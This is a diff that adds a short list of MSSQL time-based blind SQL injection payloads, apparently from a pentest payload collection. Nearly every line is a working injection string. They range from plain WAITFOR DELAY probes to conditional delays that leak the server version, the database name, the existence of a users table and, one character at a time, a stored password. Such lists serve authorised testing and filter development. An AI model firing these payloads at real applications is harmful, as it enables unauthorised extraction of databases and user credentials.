@@ -1,0 +1,17 @@
+# MSSQL — Time-Based Blind Payloads
+
+# --- Basic delay ---
+'; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'; --
+1; WAITFOR DELAY '0:0:5'--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+
+# --- Conditional delay ---
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+'; IF (1=2) WAITFOR DELAY '0:0:5'--
+'; IF (SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--
+'; IF (SUBSTRING(db_name(),1,1)='a') WAITFOR DELAY '0:0:5'--
+'; IF (ASCII(SUBSTRING(db_name(),1,1))>96) WAITFOR DELAY '0:0:5'--
+'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
+'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--
